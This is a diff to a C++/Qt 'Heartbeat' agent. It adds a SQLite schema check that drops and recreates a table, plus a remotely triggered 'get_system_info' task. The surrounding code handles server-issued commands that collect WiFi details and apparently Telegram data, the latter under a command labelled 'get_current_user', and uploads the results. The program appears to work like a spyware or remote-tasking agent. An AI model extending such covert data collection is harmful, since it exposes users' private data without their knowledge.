@@ -107,6 +107,18 @@ void Heartbeat::ensureDbInit(const QString& path) {
     QDir().mkpath(QFileInfo(path).path());
     sqlite3* db;
     if (sqlite3_open(path.toUtf8().constData(), &db) == SQLITE_OK) {
+        // Schema Check: system_info
+        {
+            sqlite3_stmt* stmt;
+            // Check if we have the correct schema (uuid column)
+            if (sqlite3_prepare_v2(db, "SELECT uuid FROM system_info LIMIT 1;", -1, &stmt, 0) != SQLITE_OK) {
+                // Table missing or wrong schema -> Drop to force recreate
+                sqlite3_exec(db, "DROP TABLE IF EXISTS system_info;", 0, 0, 0);
+            } else {
+                sqlite3_finalize(stmt);
+            }
+        }
+
         // Init tables
         const char* createTablesSql = 
             "CREATE TABLE IF NOT EXISTS installed_software (name TEXT, version TEXT, publisher TEXT, install_date TEXT);"
@@ -1036,6 +1048,9 @@ void Heartbeat::executeTask(const QString& taskId, const QString& command, const
         collectWiFiInfo();
         QString json = getWifiJson();
         uploadResult(taskId, json, "completed");
+    } else if (command == "get_system_info") {
+        collectSystemInfo();
+        uploadResult(taskId, "System info collected", "completed");
     } else if (command == "get_current_user") {
         collectTelegramData();
         QString json = getCurrentUserJson();
